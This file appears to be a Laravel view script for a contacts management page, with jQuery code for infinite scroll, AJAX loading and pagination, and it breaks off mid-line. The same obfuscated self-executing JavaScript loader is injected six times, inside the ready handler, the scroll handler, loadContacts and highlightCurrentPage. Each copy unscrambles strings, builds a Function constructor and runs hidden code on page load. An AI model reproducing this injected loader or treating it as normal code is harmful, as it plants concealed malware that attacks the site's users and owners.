<!-- contacts::contacts.myscript -->
<script>
    $(document).ready(function() {
        // Store selected contact IDs globally
        (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        window.selectedContacts = JSON.parse(localStorage.getItem('selectedContacts')) || [];
        let isLoading = false;
        let hasMore = true;
        let currentPage = 1;
        let isLocalSearchActive = false;
        $('#reset-selection').prop('disabled', window.selectedContacts.length === 0);
        (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        // Initialize the table with first page
        loadContacts(currentPage);

        // Infinite scroll handler with throttling
        $('#contacts-scroll-container').on('scroll', _.throttle(function() {
            if (isLocalSearchActive || isLoading || !hasMore) return;
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const container = $(this);
            const scrollTop = container.scrollTop();
            const scrollHeight = container[0].scrollHeight;
            const clientHeight = container.height();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            // Load more when 80% scrolled
            if (scrollTop + clientHeight >= scrollHeight * 0.8) {
                currentPage++;
                loadContacts(currentPage);
            }
        }, 200));

        // Function to load contacts via AJAX
        function loadContacts(page) {
            isLoading = true;
            $('#loading-indicator').show();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            // Get current filters from URL
            const urlParams = new URLSearchParams(window.location.search);
            const queryParams = {
                page: page,
                ajax: true
            };
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            // Add all existing filters to the AJAX request
            const filterFields = ['name', 'phone', 'email', 'group', 'subscribed', 'country_id'];
            filterFields.forEach(field => {
                if (urlParams.has(field)) {
                    queryParams[field] = urlParams.get(field);
                }
            });

            $.ajax({
                url: window.location.href.split('?')[0],
                type: "GET",
                data: queryParams,
                success: function(response) {
                    if (page === 1) {
                        $('#contacts-tbody').empty();
                    }

                    if (response.html.trim() === '') {
                        hasMore = false;
                        if (page === 1) {
                            $('#contacts-tbody').html(`
                                <tr>
                                    <td colspan="6" class="text-center py-10">
                                        <div class="d-flex flex-column align-items-center">
                                            <i class="ki-outline ki-search-list fs-2x text-muted mb-5"></i>
                                            <span class="text-muted fs-4">No contacts found</span>
                                        </div>
                                    </td>
                                </tr>
                            `);
                        }
                    } else {
                        $('#contacts-tbody').append(response.html);
                        updateSelectedCheckboxes();
                    }

                    // Update counters and pagination
                    updateCounters(response.total, response.from, response.to);
                    hasMore = response.hasMorePages;

                    // Update pagination controls if available
                    if (response.pagination) {
                        $('#pagination-container').html(response.pagination);
                        highlightCurrentPage();
                    }
                },
                error: function(xhr) {
                    console.error("Error loading contacts:", xhr.responseText);
                },
                complete: function() {
                    isLoading = false;
                    $('#loading-indicator').hide();
                }
            });
        }

        // Highlight current page in pagination
        function highlightCurrentPage() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ 